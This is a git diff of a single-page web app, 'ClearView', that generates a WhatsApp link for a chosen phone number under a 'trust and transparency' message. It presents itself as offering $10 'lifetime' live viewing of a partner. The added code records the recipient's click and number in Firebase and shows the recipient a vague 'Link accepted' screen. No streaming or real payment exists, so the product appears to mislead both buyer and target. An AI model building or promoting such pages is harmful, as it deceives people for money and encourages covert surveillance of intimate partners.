@@ -4,6 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>ClearView · Lifetime Access</title>
+  
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  
   <style>
     :root {
       --bg: #0a0e14;
@@ -763,7 +768,8 @@
   </style>
 </head>
 <body>
-<div class="dashboard">
+
+<div class="dashboard" id="mainDashboard">
   <!-- Brand Header -->
   <div class="brand-header">
     <div class="brand-logo">ClearView</div>
@@ -813,7 +819,7 @@
         <strong style="color: var(--accent);">📎 Connection Link Generated</strong>
         <span style="font-size: 0.8rem; color: var(--muted);">Waiting for user to click</span>
       </div>
-      <div class="link-url" id="generatedLink">https://bigza256.github.io/ClearView/?connect=ABC123XYZ</div>
+      <div class="link-url" id="generatedLink"></div>
       <div class="emotional-message reassurance" id="waitingMessage" style="display: none;">
         💚 "You've taken the first step towards rebuilding trust. Your connection request is on its way."
       </div>
@@ -823,9 +829,6 @@
         </button>
         <button class="link-action-btn" id="openWhatsAppBtn">
           <span>💬</span> Open WhatsApp
-        </button>
-        <button class="link-action-btn" id="simulateClickBtn">
-          <span>🖱️</span> Simulate User Click
         </button>
       </div>
     </div>
@@ -860,7 +863,7 @@
           <span>Send a connection request to begin</span>
           <span style="font-size: 0.8rem; color: var(--muted);">ClearView — Transparency creates understanding</span>
         </div>
-        <!-- Payment Overlay (initially hidden) -->
+        <!-- Payment Overlay -->
         <div class="payment-overlay" id="paymentOverlay" style="display: none;">
           <div class="payment-card">
             <div class="payment-icon">🔒</div>
@@ -967,413 +970,340 @@
 </button>
 
 <script>
-  (function() {
-    // DOM Elements
-    const phoneInput = document.getElementById('phoneInput');
-    const sendWhatsAppBtn = document.getElementById('sendWhatsAppBtn');
-    const linkPreview = document.getElementById('linkPreview');
-    const generatedLink = document.getElementById('generatedLink');
-    const copyLinkBtn = document.getElementById('copyLinkBtn');
-    const openWhatsAppBtn = document.getElementById('openWhatsAppBtn');
-    const simulateClickBtn = document.getElementById('simulateClickBtn');
-    const statusIndicator = document.getElementById('statusIndicator');
-    const statusText = document.getElementById('statusText');
-    const phoneChip = document.getElementById('phoneChip');
-    const linkChip = document.getElementById('linkChip');
-    const accessChip = document.getElementById('accessChip');
-    const videoStatus = document.getElementById('videoStatus');
-    const remoteVideo = document.getElementById('remoteVideo');
-    const videoPlaceholder = document.getElementById('videoPlaceholder');
-    const videoContainer = document.getElementById('videoContainer');
-    const paymentOverlay = document.getElementById('paymentOverlay');
-    const payNowBtn = document.getElementById('payNowBtn');
-    const expiryTimer = document.getElementById('expiryTimer');
-    const logArea = document.getElementById('logArea');
-    const whatsappMessagePreview = document.getElementById('whatsappMessagePreview');
-    const previewLink = document.getElementById('previewLink');
-    const whatsappFloat = document.getElementById('whatsappFloat');
-    const waitingMessage = document.getElementById('waitingMessage');
-    const hopeMessage = document.getElementById('hopeMessage');
-    const trustMessage = document.getElementById('trustMessage');
-    const premiumMessage = document.getElementById('premiumMessage');
+  // Initialize Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyDOeRWTL_BMjlYfRtAUklnZZ3xUxUfC40E",
+    authDomain: "clearview-fcbeb.firebaseapp.com",
+    projectId: "clearview-fcbeb",
+    storageBucket: "clearview-fcbeb.firebasestorage.app",
+    messagingSenderId: "652271153227",
+    appId: "1:652271153227:web:d65d57fdd36923bae29dce",
+    measurementId: "G-WF3PB083CW"
+  };
 
-    // State
-    let currentPhoneNumber = '+1 (555) 123-4567';
-    let connectionLink = '';
-    let isConnected = false;
-    let isPaid = false;
-    let linkGenerated = false;
-    let linkSent = false;
-    let linkClicked = false;
-    let timerInterval = null;
-    let secondsRemaining = 3600; // 1 hour in seconds
-    let lifetimeAccess = false;
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
 
-    // Generate unique link using GitHub Pages URL
-    function generateConnectionLink(phoneNumber) {
-      const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
-      const hash = btoa(cleanNumber).replace(/[^a-zA-Z0-9]/g, '').substring(0, 8);
-      const randomPart = Math.random().toString(36).substring(2, 6).toUpperCase();
-      // Use the actual GitHub Pages URL
-      return `https://bigza256.github.io/ClearView/?connect=${hash}${randomPart}`;
-    }
+  // DOM Elements
+  const phoneInput = document.getElementById('phoneInput');
+  const sendWhatsAppBtn = document.getElementById('sendWhatsAppBtn');
+  const linkPreview = document.getElementById('linkPreview');
+  const generatedLink = document.getElementById('generatedLink');
+  const copyLinkBtn = document.getElementById('copyLinkBtn');
+  const openWhatsAppBtn = document.getElementById('openWhatsAppBtn');
+  const statusIndicator = document.getElementById('statusIndicator');
+  const statusText = document.getElementById('statusText');
+  const phoneChip = document.getElementById('phoneChip');
+  const linkChip = document.getElementById('linkChip');
+  const accessChip = document.getElementById('accessChip');
+  const videoStatus = document.getElementById('videoStatus');
+  const videoPlaceholder = document.getElementById('videoPlaceholder');
+  const paymentOverlay = document.getElementById('paymentOverlay');
+  const payNowBtn = document.getElementById('payNowBtn');
+  const expiryTimer = document.getElementById('expiryTimer');
+  const logArea = document.getElementById('logArea');
+  const previewLink = document.getElementById('previewLink');
+  const whatsappFloat = document.getElementById('whatsappFloat');
+  const waitingMessage = document.getElementById('waitingMessage');
+  const hopeMessage = document.getElementById('hopeMessage');
+  const trustMessage = document.getElementById('trustMessage');
+  const premiumMessage = document.getElementById('premiumMessage');
 
-    // Format phone number for WhatsApp
-    function formatPhoneForWhatsApp(phoneNumber) {
-      return phoneNumber.replace(/[^0-9+]/g, '');
-    }
+  // State
+  let currentPhoneNumber = '+1 (555) 123-4567';
+  let connectionLink = '';
+  let currentConnectionCode = '';
+  let isConnected = false;
+  let isPaid = false;
+  let linkGenerated = false;
+  let timerInterval = null;
+  let secondsRemaining = 3600;
 
-    // Create WhatsApp message with working link
-    function createWhatsAppMessage(link) {
-      return `🤝 *Connection Request*\n\nI'd like us to be more open with each other. This is about trust and transparency.\n\n👉 *Click here to connect securely via ClearView:* ${link}\n\n_See clearly. Trust fully. Connect deeply._`;
-    }
-
-    // Format timer display
-    function formatTime(seconds) {
-      const hours = Math.floor(seconds / 3600);
-      const minutes = Math.floor((seconds % 3600) / 60);
-      const secs = seconds % 60;
-      return `${hours > 0 ? hours + ':' : ''}${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-    }
-
-    // Start expiry timer
-    function startExpiryTimer() {
-      if (timerInterval) clearInterval(timerInterval);
-      secondsRemaining = 3600; // Reset to 1 hour
-      
-      timerInterval = setInterval(() => {
-        secondsRemaining--;
-        if (secondsRemaining <= 0) {
-          clearInterval(timerInterval);
-          expiryTimer.textContent = '⏰ Expired';
-          addLog('⏰ Access expired. Please renew connection.');
-          if (!isPaid) {
-            resetConnection();
-          }
-        } else {
-          expiryTimer.textContent = `⏰ Expires in: ${formatTime(secondsRemaining)}`;
+  // Generate unique link
+  function generateConnectionLink(phoneNumber) {
+    const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
+    const hash = btoa(cleanNumber).replace(/[^a-zA-Z0-9]/g, '').substring(0, 8);
+    const randomPart = Math.random().toString(36).substring(2, 6).toUpperCase();
+    const connectionCode = hash + randomPart;
+    
+    // Store in Firebase
+    database.ref('connections/' + connectionCode).set({
+      clicked: false,
+      paid: false,
+      created: Date.now(),
+      phone: cleanNumber
+    });
+    
+    // Listen for real-time updates
+    database.ref('connections/' + connectionCode).on('value', (snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        if (data.clicked && !data.paid) {
+          showPaymentLock();
+        } else if (data.paid) {
+          showConnectedView();
         }
-      }, 1000);
-    }
+      }
+    });
+    
+    currentConnectionCode = connectionCode;
+    return `https://cearview.github.io/ClearView/?connect=${connectionCode}`;
+  }
 
-    // Stop timer
-    function stopTimer() {
-      if (timerInterval) {
+  // Format phone for WhatsApp
+  function formatPhoneForWhatsApp(phoneNumber) {
+    return phoneNumber.replace(/[^0-9+]/g, '');
+  }
+
+  // Create WhatsApp message
+  function createWhatsAppMessage(link) {
+    return `🤝 *Connection Request*\n\nI'd like us to be more open with each other. This is about trust and transparency.\n\n👉 *Click here to connect securely via ClearView:* ${link}\n\n_See clearly. Trust fully. Connect deeply._`;
+  }
+
+  // Format timer
+  function formatTime(seconds) {
+    const hours = Math.floor(seconds / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    const secs = seconds % 60;
+    return `${hours > 0 ? hours + ':' : ''}${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+  }
+
+  // Start expiry timer
+  function startExpiryTimer() {
+    if (timerInterval) clearInterval(timerInterval);
+    secondsRemaining = 3600;
+    
+    timerInterval = setInterval(() => {
+      secondsRemaining--;
+      if (secondsRemaining <= 0) {
         clearInterval(timerInterval);
-        timerInterval = null;
-      }
-    }
-
-    // Reset connection
-    function resetConnection() {
-      linkClicked = false;
-      isConnected = false;
-      isPaid = false;
-      lifetimeAccess = false;
-      paymentOverlay.style.display = 'none';
-      videoStatus.textContent = 'ClearView Stream';
-      accessChip.style.display = 'none';
-      updateStatus('failed', 'Connection expired. Please request a new link.');
-      videoPlaceholder.innerHTML = `
-        <div class="placeholder-icon">⏰</div>
-        <strong>Connection Expired</strong>
-        <span>Request a new link to reconnect with ClearView</span>
-      `;
-    }
-
-    // Open WhatsApp with pre-filled message
-    function openWhatsAppWithMessage(phoneNumber, message) {
-      const formattedNumber = formatPhoneForWhatsApp(phoneNumber);
-      const encodedMessage = encodeURIComponent(message);
-      const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodedMessage}`;
-      window.open(whatsappUrl, '_blank');
-      addLog(`📲 WhatsApp opened for ${phoneNumber}`);
-      addLog(`📤 ClearView connection request sent. Waiting for response...`);
-    }
-
-    // Update UI with emotional context
-    function updateStatus(status, message) {
-      statusIndicator.className = 'status-indicator ' + status;
-      statusText.textContent = message;
-      
-      if (status === 'connected') {
-        isConnected = true;
-        videoStatus.textContent = '🔴 LIVE STREAM';
-        videoPlaceholder.innerHTML = `
-          <div class="placeholder-icon">🤝</div>
-          <strong>Connected in Trust</strong>
-          <span>Live connection established — transparency in action</span>
-          <span style="color: var(--success);">✓ ClearView WebRTC connection successful</span>
-        `;
-        hopeMessage.style.display = 'block';
-        trustMessage.style.display = 'block';
-      } else if (status === 'locked') {
-        isConnected = false;
-        videoStatus.textContent = '🔒 ACCESS REQUIRED';
-        accessChip.style.display = 'inline-block';
-        accessChip.textContent = '🔒 Access Locked';
-      } else if (status === 'failed') {
-        isConnected = false;
-        videoStatus.textContent = 'ClearView Stream';
-        videoPlaceholder.innerHTML = `
-          <div class="placeholder-icon">💔</div>
-          <strong>Connection Not Accepted</strong>
-          <span>Sometimes trust takes time to rebuild</span>
-          <span style="color: var(--muted);">Keep the conversation going</span>
-        `;
-      } else if (status === 'waiting') {
-        isConnected = false;
-        videoStatus.textContent = 'ClearView Stream';
-        videoPlaceholder.innerHTML = `
-          <div class="placeholder-icon">⏳</div>
-          <strong>Waiting for Their Response...</strong>
-          <span>They need to click the link to accept</span>
-          <span style="font-size: 0.8rem; color: var(--muted);">Patience is part of trust</span>
-        `;
-        waitingMessage.style.display = 'block';
+        expiryTimer.textContent = '⏰ Expired';
+        if (!isPaid) {
+          resetConnection();
+        }
       } else {
-        isConnected = false;
-        videoStatus.textContent = 'ClearView Stream';
-        videoPlaceholder.innerHTML = `
-          <div class="placeholder-icon">💫</div>
-          <strong>Building a bridge of trust...</strong>
-          <span>Send a connection request to begin</span>
-          <span style="font-size: 0.8rem; color: var(--muted);">ClearView — Transparency creates understanding</span>
-        `;
+        expiryTimer.textContent = `⏰ Expires in: ${formatTime(secondsRemaining)}`;
       }
+    }, 1000);
+  }
+
+  // Stop timer
+  function stopTimer() {
+    if (timerInterval) {
+      clearInterval(timerInterval);
+      timerInterval = null;
     }
+  }
 
-    // Add log with emotional tone
-    function addLog(message) {
-      const logDiv = document.createElement('div');
-      const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-      logDiv.textContent = `[${timestamp}] ${message}`;
-      logArea.appendChild(logDiv);
-      logArea.scrollTop = logArea.scrollHeight;
-      while (logArea.children.length > 10) {
-        logArea.removeChild(logArea.firstChild);
-      }
-    }
+  // Reset connection
+  function resetConnection() {
+    isConnected = false;
+    isPaid = false;
+    paymentOverlay.style.display = 'none';
+    videoStatus.textContent = 'ClearView Stream';
+    accessChip.style.display = 'none';
+    updateStatus('failed', 'Connection expired. Please request a new link.');
+    videoPlaceholder.innerHTML = `
+      <div class="placeholder-icon">⏰</div>
+      <strong>Connection Expired</strong>
+      <span>Request a new link to reconnect with ClearView</span>
+    `;
+  }
 
-    // Update phone chip
-    function updatePhoneChip() {
-      phoneChip.textContent = `📱 ${currentPhoneNumber}`;
-    }
+  // Open WhatsApp
+  function openWhatsAppWithMessage(phoneNumber, message) {
+    const formattedNumber = formatPhoneForWhatsApp(phoneNumber);
+    const encodedMessage = encodeURIComponent(message);
+    const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodedMessage}`;
+    window.open(whatsappUrl, '_blank');
+    addLog(`📲 WhatsApp opened for ${phoneNumber}`);
+    addLog(`📤 ClearView connection request sent. Waiting for response...`);
+  }
 
-    // Update link chip
-    function updateLinkChip() {
-      if (linkGenerated) {
-        linkChip.textContent = `🔗 ${connectionLink.substring(0, 30)}...`;
-        linkChip.style.color = 'var(--accent)';
-      } else {
-        linkChip.textContent = '🔗 Not generated';
-        linkChip.style.color = 'var(--muted)';
-      }
-    }
-
-    // Check URL parameters on load
-    function checkUrlParameters() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const connectParam = urlParams.get('connect');
-      
-      if (connectParam) {
-        addLog('🔗 Connection link detected from URL');
-        addLog(`📱 Someone clicked your ClearView link!`);
-        simulateUserClick();
-      }
-    }
-
-    // Send WhatsApp Link
-    sendWhatsAppBtn.addEventListener('click', () => {
-      currentPhoneNumber = phoneInput.value.trim() || '+1 (555) 123-4567';
-      
-      if (!/^[+]?[\d\s\-\(\)]+$/.test(currentPhoneNumber)) {
-        addLog('❌ Please enter a valid phone number');
-        updateStatus('failed', 'Invalid phone number');
-        return;
-      }
-
-      connectionLink = generateConnectionLink(currentPhoneNumber);
-      linkGenerated = true;
-      linkSent = false;
-      linkClicked = false;
-      isPaid = false;
-      
-      // Update UI
-      generatedLink.textContent = connectionLink;
-      linkPreview.classList.add('show');
-      updatePhoneChip();
-      updateLinkChip();
-      
-      // Update preview link in WhatsApp message
-      previewLink.textContent = connectionLink;
-      previewLink.onclick = () => simulateUserClick();
-      
-      addLog(`🤝 ClearView connection link created with intention`);
-      addLog(`🔗 Link: ${connectionLink}`);
-      addLog(`📱 This link will open ClearView when clicked`);
-      
-      // Open WhatsApp automatically
-      const message = createWhatsAppMessage(connectionLink);
-      openWhatsAppWithMessage(currentPhoneNumber, message);
-      linkSent = true;
-      
-      // Show emotional waiting message
-      updateStatus('waiting', 'Your request is on its way. Trust the process.');
-      waitingMessage.style.display = 'block';
-      addLog('💚 "Every honest step brings you closer to peace of mind."');
-    });
-
-    // Copy Link
-    copyLinkBtn.addEventListener('click', async () => {
-      if (!connectionLink) return;
-      try {
-        await navigator.clipboard.writeText(connectionLink);
-        addLog('📋 Link copied — share it with care');
-      } catch (err) {
-        const textArea = document.createElement('textarea');
-        textArea.value = connectionLink;
-        document.body.appendChild(textArea);
-        textArea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textArea);
-        addLog('📋 Link copied (fallback)');
-      }
-    });
-
-    // Open WhatsApp
-    openWhatsAppBtn.addEventListener('click', () => {
-      if (!connectionLink || !currentPhoneNumber) return;
-      const message = createWhatsAppMessage(connectionLink);
-      openWhatsAppWithMessage(currentPhoneNumber, message);
-      linkSent = true;
-      updateStatus('waiting', 'Request sent again. Give them time to respond.');
-    });
-
-    // Simulate User Click (shows payment lock)
-    function simulateUserClick() {
-      if (!linkGenerated && !window.location.search.includes('connect=')) {
-        addLog('⚠️ Create a connection link first');
-        return;
-      }
-
-      if (isPaid && lifetimeAccess) {
-        addLog('🔓 Lifetime access already unlocked');
-        updateStatus('connected', 'Connected! You have lifetime ClearView access.');
-        return;
-      }
-
-      linkClicked = true;
-      addLog('🤝 They clicked the link! Opening up to trust...');
-      addLog('🔒 Premium access required to view live stream');
-      
-      // Show payment overlay
-      paymentOverlay.style.display = 'flex';
-      updateStatus('locked', 'They accepted! Unlock premium ClearView access for $10.');
-      accessChip.style.display = 'inline-block';
-      accessChip.textContent = '🔒 Access Locked - $10';
-      
-      // Start expiry timer
-      startExpiryTimer();
-      addLog('⏰ 1-hour access window started');
-      addLog('💎 One-time payment for lifetime ClearView access');
-    }
-
-    simulateClickBtn.addEventListener('click', simulateUserClick);
-
-    // Pay Now button
-    payNowBtn.addEventListener('click', () => {
-      isPaid = true;
-      lifetimeAccess = true;
-      paymentOverlay.style.display = 'none';
-      stopTimer();
-      
-      updateStatus('connected', 'Payment successful! Lifetime ClearView access unlocked.');
-      accessChip.textContent = '💎 Lifetime Access';
-      accessChip.style.color = 'var(--premium)';
+  // Update UI
+  function updateStatus(status, message) {
+    statusIndicator.className = 'status-indicator ' + status;
+    statusText.textContent = message;
+    
+    if (status === 'connected') {
+      isConnected = true;
       videoStatus.textContent = '🔴 LIVE STREAM';
-      
-      premiumMessage.style.display = 'block';
-      addLog('💳 Payment of $10 processed successfully');
-      addLog('💎 Lifetime ClearView access activated');
-      addLog('🔓 Connection will never expire (until they change phones)');
-      
-      // Show live stream
-      videoPlaceholder.innerHTML = `
-        <div class="placeholder-icon">🌟</div>
-        <strong>Live Connection Active</strong>
-        <span>Clear view — no more doubts, just understanding</span>
-        <span style="color: var(--success);">✓ Lifetime ClearView secure stream</span>
-      `;
-      
-      setTimeout(() => {
-        addLog('📹 ClearView live view active — clarity at last');
-      }, 1500);
-    });
+      hopeMessage.style.display = 'block';
+      trustMessage.style.display = 'block';
+    } else if (status === 'locked') {
+      isConnected = false;
+      videoStatus.textContent = '🔒 ACCESS REQUIRED';
+      accessChip.style.display = 'inline-block';
+      accessChip.textContent = '🔒 Access Locked';
+    } else if (status === 'waiting') {
+      isConnected = false;
+      videoStatus.textContent = 'ClearView Stream';
+      waitingMessage.style.display = 'block';
+    }
+  }
 
-    // Preview link click
-    previewLink.addEventListener('click', (e) => {
-      e.preventDefault();
-      simulateUserClick();
-    });
+  // Show payment lock
+  function showPaymentLock() {
+    paymentOverlay.style.display = 'flex';
+    updateStatus('locked', 'They accepted! Unlock premium ClearView access for $10.');
+    accessChip.style.display = 'inline-block';
+    accessChip.textContent = '🔒 Access Locked - $10';
+    startExpiryTimer();
+    addLog('🤝 They clicked the link! Opening up to trust...');
+    addLog('🔒 Premium access required to view live stream');
+    addLog('⏰ 1-hour access window started');
+  }
 
-    // Phone input change
-    phoneInput.addEventListener('input', () => {
-      currentPhoneNumber = phoneInput.value;
-      if (linkGenerated) {
-        linkGenerated = false;
-        linkSent = false;
-        linkClicked = false;
-        isPaid = false;
-        lifetimeAccess = false;
-        linkPreview.classList.remove('show');
-        updateLinkChip();
-        updateStatus('idle', 'Take a deep breath. Trust begins with a single step.');
-        addLog('🔄 Starting fresh — new number, new beginning');
-        paymentOverlay.style.display = 'none';
-        accessChip.style.display = 'none';
-        waitingMessage.style.display = 'none';
-        hopeMessage.style.display = 'none';
-        trustMessage.style.display = 'none';
-        premiumMessage.style.display = 'none';
-        stopTimer();
-      }
-    });
+  // Show connected view
+  function showConnectedView() {
+    isPaid = true;
+    paymentOverlay.style.display = 'none';
+    stopTimer();
+    
+    updateStatus('connected', 'Payment successful! Lifetime ClearView access unlocked.');
+    accessChip.textContent = '💎 Lifetime Access';
+    accessChip.style.color = 'var(--premium)';
+    videoStatus.textContent = '🔴 LIVE STREAM';
+    
+    premiumMessage.style.display = 'block';
+    addLog('💳 Payment of $10 processed successfully');
+    addLog('💎 Lifetime ClearView access activated');
+    addLog('🔓 Connection will never expire (until they change phones)');
+    
+    videoPlaceholder.innerHTML = `
+      <div class="placeholder-icon">🌟</div>
+      <strong>Live Connection Active</strong>
+      <span>Clear view — no more doubts, just understanding</span>
+      <span style="color: var(--success);">✓ Lifetime ClearView secure stream</span>
+    `;
+  }
 
-    // Floating WhatsApp button
-    whatsappFloat.addEventListener('click', () => {
-      if (linkGenerated && connectionLink && linkSent) {
-        const message = createWhatsAppMessage(connectionLink);
-        openWhatsAppWithMessage(currentPhoneNumber, message);
-        addLog('💚 "Persistence with patience shows genuine care."');
-      } else if (linkGenerated && connectionLink) {
-        const message = createWhatsAppMessage(connectionLink);
-        openWhatsAppWithMessage(currentPhoneNumber, message);
-        linkSent = true;
-        updateStatus('waiting', 'Request sent. Give them time to respond.');
-      } else {
-        sendWhatsAppBtn.click();
-      }
-    });
+  // Add log
+  function addLog(message) {
+    const logDiv = document.createElement('div');
+    const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    logDiv.textContent = `[${timestamp}] ${message}`;
+    logArea.appendChild(logDiv);
+    logArea.scrollTop = logArea.scrollHeight;
+    while (logArea.children.length > 10) {
+      logArea.removeChild(logArea.firstChild);
+    }
+  }
 
-    // Initialize
-    function init() {
-      updatePhoneChip();
-      updateLinkChip();
-      updateStatus('idle', 'Take a deep breath. Trust begins with a single step.');
-      addLog('🌅 ClearView initialized — your journey begins');
-      addLog('💝 "Healthy relationships are built on honesty."');
-      addLog('📱 Enter their number when you\'re ready');
-      addLog('💎 Lifetime ClearView access available for $10');
-      
-      phoneInput.value = '+1 (555) 123-4567';
-      
-      // Check if someone clicked the link
-      checkUrlParameters();
+  // Send WhatsApp Link
+  sendWhatsAppBtn.addEventListener('click', () => {
+    currentPhoneNumber = phoneInput.value.trim() || '+1 (555) 123-4567';
+    
+    if (!/^[+]?[\d\s\-\(\)]+$/.test(currentPhoneNumber)) {
+      addLog('❌ Please enter a valid phone number');
+      return;
     }
 
-    init();
-  })();
+    connectionLink = generateConnectionLink(currentPhoneNumber);
+    linkGenerated = true;
+    isPaid = false;
+    
+    generatedLink.textContent = connectionLink;
+    linkPreview.classList.add('show');
+    phoneChip.textContent = `📱 ${currentPhoneNumber}`;
+    linkChip.textContent = `🔗 ${connectionLink.substring(0, 30)}...`;
+    linkChip.style.color = 'var(--accent)';
+    
+    previewLink.textContent = connectionLink;
+    
+    addLog(`🤝 ClearView connection link created with intention`);
+    addLog(`🔗 Link: ${connectionLink}`);
+    addLog(`📱 This link will open ClearView when clicked`);
+    
+    const message = createWhatsAppMessage(connectionLink);
+    openWhatsAppWithMessage(currentPhoneNumber, message);
+    
+    updateStatus('waiting', 'Your request is on its way. Trust the process.');
+    waitingMessage.style.display = 'block';
+    addLog('💚 "Every honest step brings you closer to peace of mind."');
+  });
+
+  // Copy Link
+  copyLinkBtn.addEventListener('click', async () => {
+    if (!connectionLink) return;
+    try {
+      await navigator.clipboard.writeText(connectionLink);
+      addLog('📋 Link copied — share it with care');
+    } catch (err) {
+      const textArea = document.createElement('textarea');
+      textArea.value = connectionLink;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textArea);
+      addLog('📋 Link copied (fallback)');
+    }
+  });
+
+  // Open WhatsApp
+  openWhatsAppBtn.addEventListener('click', () => {
+    if (!connectionLink || !currentPhoneNumber) return;
+    const message = createWhatsAppMessage(connectionLink);
+    openWhatsAppWithMessage(currentPhoneNumber, message);
+    updateStatus('waiting', 'Request sent again. Give them time to respond.');
+  });
+
+  // Pay Now button
+  payNowBtn.addEventListener('click', () => {
+    if (currentConnectionCode) {
+      database.ref('connections/' + currentConnectionCode + '/paid').set(true);
+      showConnectedView();
+    }
+  });
+
+  // Check if someone opened the link
+  function checkUrlParameters() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const connectParam = urlParams.get('connect');
+    
+    if (connectParam) {
+      // Mark as clicked in Firebase
+      database.ref('connections/' + connectParam + '/clicked').set(true);
+      
+      // Show recipient view
+      document.getElementById('mainDashboard').innerHTML = `
+        <div style="text-align: center; padding: 50px; background: var(--panel); border-radius: var(--radius); border: 1px solid var(--border);">
+          <div style="font-size: 4rem; margin-bottom: 1rem;">🤝</div>
+          <h1 style="color: var(--accent); margin-bottom: 1rem;">Connecting to ClearView...</h1>
+          <p style="color: var(--muted); font-size: 1.1rem;">Please wait while we establish a secure connection.</p>
+          <p style="color: var(--accent); margin-top: 1rem; font-size: 1.2rem;">✓ Link accepted! The other person will be notified.</p>
+          <p style="color: var(--muted); margin-top: 2rem; font-size: 0.9rem;">You can close this window now.</p>
+        </div>
+      `;
+      document.getElementById('whatsappFloat').style.display = 'none';
+    }
+  }
+
+  // Floating WhatsApp button
+  whatsappFloat.addEventListener('click', () => {
+    if (linkGenerated && connectionLink) {
+      const message = createWhatsAppMessage(connectionLink);
+      openWhatsAppWithMessage(currentPhoneNumber, message);
+      addLog('💚 "Persistence with patience shows genuine care."');
+    } else {
+      sendWhatsAppBtn.click();
+    }
+  });
+
+  // Initialize
+  function init() {
+    phoneChip.textContent = `📱 ${currentPhoneNumber}`;
+    linkChip.textContent = '🔗 Not generated';
+    updateStatus('idle', 'Take a deep breath. Trust begins with a single step.');
+    addLog('🌅 ClearView initialized — your journey begins');
+    addLog('💝 "Healthy relationships are built on honesty."');
+    addLog('📱 Enter their number when you\'re ready');
+    addLog('💎 Lifetime ClearView access available for $10');
+    
+    checkUrlParameters();
+  }
+
+  init();
 </script>
 </body>
 </html>
